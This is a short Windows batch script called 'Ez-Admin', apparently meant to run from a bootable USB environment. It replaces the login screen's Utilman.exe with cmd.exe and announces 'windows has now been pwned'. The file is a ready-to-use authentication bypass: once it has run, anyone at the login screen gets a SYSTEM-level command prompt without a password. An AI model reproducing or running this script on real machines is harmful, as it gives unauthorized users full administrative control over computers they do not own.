:start 
cls
@echo off
color D
title -- Ez-Admin - Made by rainestorme --
echo                .----------------------.
echo                | Welcome to Ez-Admin! |
echo                '----------------------'
echo.
echo           Stage 1: Backing up Utilman.exe...
echo.
C:
cd Windows
cd System32
copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.bak
timeout /t 3
echo.
echo        Stage 2: Copying cmd.exe to Utilman.exe...
xcopy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
echo.
timeout /t 3
cls
echo            --- windows has now been pwned ---
echo          --- the system will now shut down. ---
echo --- when the screen goes black, remove the usb drive ---
timeout /t 10
wpeutil reboot
exit
